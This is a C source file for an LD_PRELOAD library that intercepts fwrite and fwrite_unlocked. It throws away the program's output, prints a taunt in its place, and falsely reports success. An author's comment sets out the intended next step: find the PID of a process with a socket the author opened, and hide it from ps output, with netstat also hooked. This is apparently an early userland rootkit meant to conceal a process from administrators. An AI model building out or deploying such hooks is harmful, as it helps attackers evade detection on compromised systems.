#define _GNU_SOURCE
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>

static size_t (*real_fwrite)(const void *, size_t, size_t, FILE *) = NULL;
static size_t (*real_fwrite_unlocked)(const void *, size_t, size_t,
                                      FILE *) = NULL;
static pthread_once_t init_once = PTHREAD_ONCE_INIT;

static void init_syms(void) {
  real_fwrite = dlsym(RTLD_NEXT, "fwrite");
  real_fwrite_unlocked = dlsym(RTLD_NEXT, "fwrite_unlocked");
}

static size_t write_lol(FILE *stream, size_t size, size_t nmemb,
                        size_t (*realfn)(const void *, size_t, size_t,
                                         FILE *)) {
  const char *msg = "no data for you :P";
  // actually write "lol" (3 bytes)
  if (realfn)
    (void)realfn(msg, 1, strlen(msg), stream);
  // pretend we wrote whatever the caller asked for to keep callers happy
  return nmemb;
}

/*

1) figure out how ps calls write() -> for each line?

write() should: find the PID of the process with the socket we opened (call
netstat to do this -> but we hooked that too, so I am thinking look in the /proc
directory), then stop any lines with the PID i detect

Also this is specific to certain ps commands, like if theres a "format option" +
certain version binaries. So will have to account for all of this behaviour in
how different versions + different formatting options call the frwrite()

*/

size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) {
  pthread_once(&init_once, init_syms);
  return write_lol(stream, size, nmemb, real_fwrite);
}

size_t fwrite_unlocked(const void *ptr, size_t size, size_t nmemb,
                       FILE *stream) {
  pthread_once(&init_once, init_syms);
  return write_lol(stream, size, nmemb, real_fwrite_unlocked);
}
